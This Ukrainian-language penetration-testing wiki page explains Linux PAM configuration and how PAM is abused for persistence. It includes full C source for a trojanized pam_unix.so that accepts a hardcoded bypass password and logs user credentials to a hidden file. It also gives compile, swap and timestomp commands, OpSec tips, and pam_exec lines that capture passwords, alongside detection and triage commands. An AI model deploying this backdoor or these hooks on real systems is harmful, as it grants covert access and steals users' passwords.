# PAM - Pluggable Authentication Modules

{{#include ../../banners/hacktricks-training.md}}

### Основна інформація

**PAM (Pluggable Authentication Modules)** — це механізм безпеки, який **перевіряє особу користувачів, що намагаються отримати доступ до комп’ютерних служб**, і контролює їхній доступ за різними критеріями. Це свого роду цифровий воротар, який стежить, щоб лише авторизовані користувачі могли користуватися певними службами, водночас потенційно обмежуючи їхнє використання, щоб запобігти перевантаженню системи.

#### Файли конфігурації

- **Solaris** підтримує застарілий централізований файл `/etc/pam.conf`, але в актуальних рекомендаціях перевагу надають файлам служб у `/etc/pam.d`.<sup>[[10]](#references)</sup>
- **Linux-системи** використовують підхід із каталогом, зберігаючи конфігурації для окремих служб у `/etc/pam.d`. Наприклад, файл конфігурації служби входу розташований у `/etc/pam.d/login`.<sup>[[1]](#references)</sup>

Приклад конфігурації PAM для служби входу може мати такий вигляд:

```
auth required /lib/security/pam_securetty.so
auth required /lib/security/pam_nologin.so
auth sufficient /lib/security/pam_ldap.so
auth required /lib/security/pam_unix_auth.so try_first_pass
account sufficient /lib/security/pam_ldap.so
account required /lib/security/pam_unix_acct.so
password required /lib/security/pam_cracklib.so
password required /lib/security/pam_ldap.so
password required /lib/security/pam_pwdb.so use_first_pass
session required /lib/security/pam_unix_session.so
```

#### **Області керування PAM**

Ці області, або групи керування, охоплюють **auth**, **account**, **password** і **session**. Кожна відповідає за окремий аспект процесу автентифікації та керування сеансами:<sup>[[1]](#references)</sup>

- **Auth**: Перевіряє особу користувача, часто запитуючи пароль.
- **Account**: Перевіряє обліковий запис, зокрема членство в групах або обмеження за часом доби.
- **Password**: Керує оновленням паролів, зокрема перевірками складності та захистом від словникових атак.
- **Session**: Керує діями на початку або наприкінці сеансу служби, наприклад монтуванням каталогів або встановленням обмежень ресурсів.

#### **Керування модулями PAM**

Керувальні прапорці визначають реакцію модуля на успіх або помилку, впливаючи на загальний процес автентифікації. До них належать:<sup>[[1]](#references)</sup>

- **Required**: Помилка обов’язкового модуля зрештою призводить до помилки, але лише після перевірки всіх наступних модулів.
- **Requisite**: Негайно завершує процес у разі помилки.
- **Sufficient**: Якщо попередній модуль `required` не завершився помилкою, успіх негайно повертається, а решта модулів у тій самій групі керування пропускаються.
- **Optional**: Спричиняє помилку лише тоді, коли це єдиний модуль у стеку.

#### Важливі семантичні аспекти з погляду атак

Під час аналізу або зміни PAM **місце вставлення правила** визначає, який стек його оброблятиме:<sup>[[1]](#references)[[13]](#references)</sup>

- `include` і `substack` підтягують правила з інших файлів, тому редагування `sshd` може вплинути лише на SSH, тоді як зміни в `system-auth`, `common-auth` або іншому спільному стеку можуть одночасно вплинути на кілька служб.<sup>[[1]](#references)[[13]](#references)</sup>
- PAM також підтримує керувальні прапорці у квадратних дужках, наприклад `[success=1 default=ignore]`. Їх можна використати для **пропуску одного або кількох модулів** після успішної власної перевірки замість очевидної заміни `pam_unix.so`.<sup>[[1]](#references)</sup>
- `module-path` може бути **абсолютним** (`/usr/lib/security/pam_custom.so`) або **відносним** до типового каталогу модулів PAM. У сучасних системах Linux фактичними каталогами часто є `/lib/security`, `/lib64/security`, `/usr/lib/security` або multiarch-шляхи на кшталт `/usr/lib/x86_64-linux-gnu/security`.<sup>[[1]](#references)[[14]](#references)</sup>

Короткий висновок для оператора: перш ніж вносити зміни, завжди відображайте **повний граф служб**. Наприклад, `sshd -> password-auth -> system-auth` у деяких дистрибутивах або `sshd -> system-remote-login -> system-login -> system-auth` в інших означає, що той самий однорядковий імплант може поширитися значно ширше, ніж задумано.<sup>[[1]](#references)[[13]](#references)</sup>

Власний модуль `auth` може додавати до `sudo` інтерактивну перевірку після введення пароля облікового запису. Перш ніж вручну перевіряти цю перевірку, проаналізуйте фактичний стек `/etc/pam.d/sudo`, підключену політику, аргументи модулів і дозволи на будь-який згаданий локальний файл даних. Сам по собі доступний для читання список слів для перевірки не обходить перевірку пароля й не створює правило sudoers. Для привілейованого переходу все одно потрібні правильна автентифікація облікового запису, проходження всіх обов’язкових етапів PAM і правило sudo, що надає root-доступ; автоматизоване збирання даних без нагляду не має запускати перевірку.

Для застарілої помилки прав власності Ubuntu [`pam_motd` (CVE-2010-0832)](https://ubuntu.com/security/cve-2010-0832) перевірте фактичну збірку `libpam-modules` і те, чи викликає служба входу в систему уражений модуль сеансу. Ubuntu виправила її у версії **1.1.0-2ubuntu1.1** для 9.10 і **1.1.1-2ubuntu5** для 10.04 LTS; для інших випусків або зворотних портів від постачальника потрібна окрема оцінка пакета. Описаний шлях атаки вимагав, щоб користувач замінив свій `.cache` у домашньому каталозі на symlink, а потім ініціював вхід через PAM, унаслідок чого старий модуль змінював власника захищеної цілі. Сам запис `.cache`, рядок `pam_motd.so` або стара версія ядра не доводять наявності вразливості; під час пасивного збирання даних перевірте контроль над домашнім каталогом, фактичну версію модуля, доступність входу, обробку symlink і дозволи на ціль, не замінюючи файли й не запускаючи вхід. Див. [повідомлення безпеки Ubuntu](https://ubuntu.com/security/notices/USN-959-1).

#### Приклад сценарію

У системі з кількома модулями auth процес виконується в суворо визначеному порядку. Якщо модуль `pam_securetty` виявляє, що термінал входу не авторизований, вхід root блокується, але через статус "required" обробляються всі модулі. `pam_env` встановлює змінні середовища, що потенційно покращує роботу користувача. Модулі `pam_ldap` і `pam_unix` працюють разом, щоб автентифікувати користувача; `pam_unix` намагається використати раніше введений пароль, підвищуючи ефективність і гнучкість методів автентифікації.<sup>[[1]](#references)[[13]](#references)[[15]](#references)[[16]](#references)[[17]](#references)</sup>


## `pam_permit` у стеку служби

`pam_permit.so` повертає успішний результат для перевірок PAM. Якщо користувач із нижчими привілеями може змінити фактичну політику PAM служби, додавання цього модуля з керувальним прапорцем, який передчасно завершує стек автентифікації, може прибрати перевірку пароля для цієї служби. Для `sudo` перевірте `/etc/pam.d/sudo` і всі підключені файли `common-auth` або `system-auth`, перш ніж визначати, на які служби вплинуть зміни. Обхід автентифікації PAM **не** надає нового правила sudoers; користувач усе одно має бути уповноважений виконувати запитану команду. Перевірте порядок правил і всі попередні помилки `required`, а не вважайте, що одного рядка `sufficient pam_permit.so` завжди достатньо для успіху.

## Встановлення бекдора в PAM — підміна `pam_unix.so`

Класичний прийом закріплення в системі в особливо важливих Linux-середовищах — **підмінити легітимну бібліотеку PAM троянізованою бібліотекою, що встановлюється на її місце**. На хості, де стек PAM завантажує `pam_unix.so`, під час автентифікації через SSH або консоль може викликатися її точка входу `pam_sm_authenticate()`; шкідлива підміна може перехоплювати облікові дані або реалізувати *магічний* обхід пароля.<sup>[[2]](#references)[[11]](#references)</sup>

### Пам’ятка з компіляції
Наведений нижче приклад використовує сервісну точку входу Linux-PAM `pam_sm_authenticate()` і `pam_get_authtok()` для доступу до токена автентифікації.<sup>[[11]](#references)[[12]](#references)</sup>
<details>
<summary>Приклад трояна `pam_unix.so`</summary>

```c
#define _GNU_SOURCE
#include <security/pam_modules.h>
#include <security/pam_ext.h>
#include <dlfcn.h>
#include <stdio.h>
#include <fcntl.h>
#include <string.h>
#include <unistd.h>

static void *real_module;
static int (*orig_auth)(pam_handle_t *, int, int, const char **);
static int (*orig_setcred)(pam_handle_t *, int, int, const char **);
static const char *MAGIC = "Sup3rS3cret!";

static int load_original(void) {
    if (real_module) return 0;
    real_module = dlopen("/lib/security/pam_unix.so.bak", RTLD_NOW | RTLD_LOCAL);
    if (!real_module) return -1;
    orig_auth = dlsym(real_module, "pam_sm_authenticate");
    orig_setcred = dlsym(real_module, "pam_sm_setcred");
    return (orig_auth && orig_setcred) ? 0 : -1;
}

PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    const char *user = NULL, *pass = NULL;
    pam_get_user(pamh, &user, NULL);
    pam_get_authtok(pamh, PAM_AUTHTOK, &pass, NULL);

    /* Magic pwd → immediate success */
    if(pass && strcmp(pass, MAGIC) == 0) return PAM_SUCCESS;

    /* Credential harvesting */
    if (user && pass) {
        int fd = open("/usr/bin/.dbus.log", O_WRONLY|O_APPEND|O_CREAT, 0600);
        if (fd >= 0) {
            dprintf(fd, "%s:%s\n", user, pass);
            close(fd);
        }
    }

    /* Forward to the renamed original module. */
    if (load_original() != 0) return PAM_SYSTEM_ERR;
    return orig_auth(pamh, flags, argc, argv);
}

PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    if (load_original() != 0) return PAM_SYSTEM_ERR;
    return orig_setcred(pamh, flags, argc, argv);
}
```

</details>

Скомпілюйте та приховано замініть (шаблон заміни/timestomp задокументований Unit 42). Змініть жорстко заданий шлях резервної копії у wrapper і команди нижче відповідно до фактичного каталогу модулів PAM на цільовій системі:<sup>[[2]](#references)</sup>
```bash
gcc -fPIC -shared -o pam_unix.so trojan_pam.c -ldl -lpam
mv /lib/security/pam_unix.so /lib/security/pam_unix.so.bak
mv pam_unix.so /lib/security/pam_unix.so
chmod 644 /lib/security/pam_unix.so     # keep original perms
touch -r /bin/ls /lib/security/pam_unix.so  # timestomp
```

### Поради з OpSec
1. **Атомарне перезаписування** — запишіть повну бібліотеку в тимчасовий файл і перейменуйте його, щоб замінити цільовий файл. Так ви не залишите частково записаний модуль автентифікації.
2. У межах аналізу AuthDoor від Unit 42 було виявлено шлях на кшталт `/usr/bin/.dbus.log`, тож він також є корисним індикатором для пошуку.<sup>[[2]](#references)</sup>
3. Зберігайте точки входу, очікувані стеком PAM (наприклад, `pam_sm_authenticate` і `pam_sm_setcred`), щоб інші операції керування й надалі працювали.<sup>[[11]](#references)[[18]](#references)</sup>

### Виявлення
Для перевірки цілісності пакетів RPM перевіряє метадані встановлених файлів, `debsums -s` повідомляє про помилки контрольних сум, а `dpkg -S` у блоці тріажу визначає власника пакета; синтаксис audit watch фіксує записування до шляху та зміну його атрибутів.<sup>[[6]](#references)[[7]](#references)[[8]](#references)[[9]](#references)</sup>
* Порівняйте MD5/SHA256 `pam_unix.so` з версією з пакета дистрибутива.
* Виконайте `rpm -V pam` або `debsums -s libpam-modules`, щоб виявити замінені бібліотеки без ручного обчислення хешів.
* Перевірте, чи немає файлів із правом запису для всіх або незвичним власником у `/lib/security/`.
* Правило `auditd`: `-w /lib/security/pam_unix.so -p wa -k pam-backdoor`.
* Знайдіть несподівані модулі в конфігураціях PAM: `grep -R "pam_[a-z].*\.so" /etc/pam.d/ | grep -v pam_unix`.

Цей пошук `pam_` пропускає власні модулі з іншими базовими іменами `.so`. Перевірте **активні** рядки `auth`, `account`, `password` і `session` у `/etc/pam.d` (а також `/etc/pam.conf`, якщо він використовується), зокрема їхні керувальні прапорці та всі включені стеки. Незнайомий модуль із прапорцем `auth sufficient`, розміщений перед звичайною перевіркою пароля, потребує перевірки власника пакета та бінарного файла; [синтаксис керування PAM](https://man7.org/linux/man-pages/man5/pam.d.5.html) може дозволити успішному результату передчасно завершити цю частину стека. Саме лише ім’я модуля, незвична часова мітка чи параметр `nodelay` не доводять наявність обходу. Якщо поведінка вказує на витік через часові характеристики, спершу перевірте реалізацію та доступність сервісу; під час звичайного переліку не слід знову й знову надсилати варіанти автентифікації.

### Команди для швидкого тріажу (після компрометації або під час пошуку загроз)
```bash
# 1) Spot alien PAM objects
find /{lib,usr/lib,usr/local/lib}{,64}/security -type f -printf '%p %s %M %u:%g %TY-%Tm-%Td\n' | grep -E 'pam_|libselinux'

# 2) Verify package integrity
command -v rpm >/dev/null && rpm -V pam || debsums -s libpam-modules

# 3) Identify non-packaged PAM modules
for f in /{lib,usr/lib,usr/local/lib}{,64}/security/*.so; do
    dpkg -S "$f" >/dev/null 2>&1 || echo "UNPACKAGED: $f";
done

# 4) Look for stealth config edits
grep -R "pam_.*\.so" /etc/pam.d/ | grep -E 'plg|selinux|custom|exec'
```

### Зловживання `pam_exec` для закріплення
Замість заміни `pam_unix.so` можна менш помітно додати рядок `pam_exec` у `/etc/pam.d/sshd`, щоб виклик, який доходить до цього рядка PAM, запускав допоміжний скрипт, залишаючи звичайний стек незмінним.<sup>[[4]](#references)</sup>
```bash
# Run during the auth phase; expose_authtok sends the token on stdin
auth optional pam_exec.so quiet expose_authtok /usr/local/bin/.ssh_hook.sh
```
`pam_exec` отримує метадані PAM у змінних середовища, як-от `PAM_USER`, `PAM_RHOST`, `PAM_SERVICE`, `PAM_TTY` і `PAM_TYPE`. З `expose_authtok` допоміжна програма може зчитати до `PAM_MAX_RESP_SIZE` байтів пароля зі `stdin` під час фаз `auth` або `password`. Щоб допоміжна програма запускалася з ефективним UID замість реального UID, додайте `seteuid`.<sup>[[4]](#references)</sup>

Практичні примітки щодо типів модулів і фільтра `type=`, задокументованих для `pam_exec`:<sup>[[4]](#references)</sup>

- `session optional pam_exec.so ...` краще підходить для **дій після входу**, як-от повторного відкриття сокетів або запуску від’єднаного демона.
- `auth optional pam_exec.so quiet expose_authtok ...` зазвичай використовують для **перехоплення облікових даних**, оскільки цей рядок виконується до відкриття сесії.
- `type=session` або `type=auth` можна використовувати, щоб обмежити виконання певною фазою PAM і уникнути зайвого подвійного виконання.

Під час перевірки привілеїв абсолютний шлях до допоміжної програми `pam_exec.so`, доступний для запису поточному користувачеві, може бути кандидатом, навіть якщо файл позначено атрибутом append-only (`a`): [цей атрибут дозволяє додавання в кінець файлу](https://man7.org/linux/man-pages/man1/chattr.1.html), чого може бути достатньо, щоб змінити подальшу поведінку shell-скрипту. Спершу переконайтеся, що служба PAM і подія справді доходять до цього рядка, допоміжна програма та її батьківський шлях є довіреними, а команда запускається від імені привілейованішого користувача; [`seteuid` змінює, який UID PAM використовується](https://man7.org/linux/man-pages/man8/pam_exec.8.html). Сам по собі файл, доступний для запису, або результат `lsattr` не доводить виконання з привілеями.

### Інструменти дистрибутива, що можуть перезаписати зміни: `authselect`

У системах сімейства RHEL і Fedora, де використовується `authselect`, прямі зміни згенерованих файлів, як-от `/etc/pam.d/system-auth` або `/etc/pam.d/password-auth`, можуть бути **перезаписані `authselect`**. Щоб забезпечити постійність змін, оператори часто змінюють активний користувацький профіль у `/etc/authselect/custom/<profile>/`, а потім повторно вибирають його.<sup>[[5]](#references)[[19]](#references)</sup>

Типовий порядок дій, якщо у вас є root-доступ:<sup>[[5]](#references)</sup>

```bash
# Inspect the active profile first
authselect current

# If a custom profile already exists, edit its PAM templates instead of system-auth directly
find /etc/authselect/custom -maxdepth 2 -type f \( -name 'system-auth' -o -name 'password-auth' \) -ls

# Regenerate the PAM files after modifying the active custom profile
authselect apply-changes
```

Це важливо і для атак, і для triage: якщо `/etc/pam.d/system-auth` містить банер `Generated by authselect` і `Do not modify this file manually`, то справжня точка persistence може бути в `/etc/authselect/custom/`, а не в `/etc/pam.d/`.<sup>[[5]](#references)</sup>

### Нещодавні прийоми, помічені в дикій природі

У звітах за 2025 рік про Linux backdoor **Plague** описано ту саму основну ідею, доведену далі: шкідливий компонент PAM зі **статичним паролем обходу**, а також очищення змінних середовища, пов’язаних із SSH, і shell history (`HISTFILE=/dev/null`), щоб зменшити сліди сесії після входу.<sup>[[3]](#references)</sup> Це корисний шаблон для пошуку, оскільки логіка backdoor може міститися в PAM, тоді як артефакти приховування з’являються лише **після** успішної автентифікації.


## References

- [1] [pam.conf(5) / pam.d(5) — посібник Linux-PAM](https://man7.org/linux/man-pages/man5/pam.d.5.html)
- [2] [Посібник таємного оператора: проникнення в глобальні телекомунікаційні мережі — Unit 42](https://unit42.paloaltonetworks.com/infiltration-of-global-telecom-networks/)
- [3] [Nextron Systems — Plague: нещодавно виявлений PAM-based backdoor для Linux](https://www.nextron-systems.com/2025/08/01/plague-a-newly-discovered-pam-based-backdoor-for-linux/)
- [4] [pam_exec(8) — посібник Linux-PAM](https://man7.org/linux/man-pages/man8/pam_exec.8.html)
- [5] [Налаштування автентифікації користувачів за допомогою authselect — Red Hat Enterprise Linux](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/10/html/configuring_authentication_and_authorization_in_rhel/configuring-user-authentication-using-authselect)
- [6] [rpm(8) — RPM](https://rpm.org/docs/4.20.x/man/rpm.8)
- [7] [debsums(1) — сторінки посібника Debian](https://manpages.debian.org/unstable/debsums/debsums.1.en.html)
- [8] [auditctl(8) — сторінка посібника Linux](https://man7.org/linux/man-pages/man8/auditctl.8.html)
- [9] [dpkg-query(1) — сторінки посібника Debian](https://manpages.debian.org/testing/dpkg/dpkg-query.1.en.html)
- [10] [Керування автентифікацією в Oracle Solaris 11.4](https://docs.oracle.com/cd/E37838_01/pdf/E67470.pdf)
- [11] [pam_sm_authenticate(3) — посібник Linux-PAM](https://man7.org/linux/man-pages/man3/pam_sm_authenticate.3.html)
- [12] [pam_get_authtok(3) — посібник Linux-PAM](https://man7.org/linux/man-pages/man3/pam_get_authtok.3.html)
- [13] [Посібник з автентифікації на рівні системи — Red Hat Enterprise Linux 7](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/7/html-single/system-level_authentication_guide/index)
- [14] [Список файлів пакета Ubuntu: libpam-modules/noble/amd64](https://packages.ubuntu.com/noble/amd64/libpam-modules/filelist)
- [15] [pam_env(8) — посібник Linux-PAM](https://man7.org/linux/man-pages/man8/pam_env.8.html)
- [16] [pam_unix(8) — посібник Linux-PAM](https://man7.org/linux/man-pages/man8/pam_unix.8.html)
- [17] [pam_ldap(5) — сторінки посібника Debian](https://manpages.debian.org/testing/libpam-ldap/pam_ldap.5.en.html)
- [18] [pam_sm_setcred(3) — посібник Linux-PAM](https://man7.org/linux/man-pages/man3/pam_sm_setcred.3.html)
- [19] [Зміни/Зробити Authselect обов’язковим — вікі Fedora Project](https://fedoraproject.org/wiki/Changes/Make_Authselect_Mandatory)
{{#include ../../banners/hacktricks-training.md}}
